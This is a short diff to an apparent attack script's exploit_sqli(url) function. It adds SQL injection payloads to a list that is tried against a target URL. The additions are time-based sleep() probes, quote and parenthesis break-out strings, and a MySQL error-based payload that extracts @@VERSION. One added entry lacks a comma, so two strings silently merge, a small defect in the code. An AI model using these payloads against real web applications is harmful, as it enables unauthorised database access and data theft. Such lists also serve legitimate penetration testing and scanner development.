@@ -385,7 +385,22 @@ def exploit_sqli(url):
         "' OR 'a'='a' --",
         "1 OR 1=1",
         "admin' --",
-        "' UNION SELECT NULL, NULL --"
+        "' UNION SELECT NULL, NULL --",
+        "[Nothing]", 
+        " ' or sleep(1) or '",
+        ' " or sleep(1) or " ',
+        " sleep(3)",
+        " sleep(3)/*' or sleep(3) or '' or sleep(3) or'*/" 
+        "'",
+        '"',
+        "`",
+        "')",
+        '")',
+        '`)',
+        "'))",
+        '"))',
+        "`))",
+        "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
     ]
 
     # Try each payload against the target URL
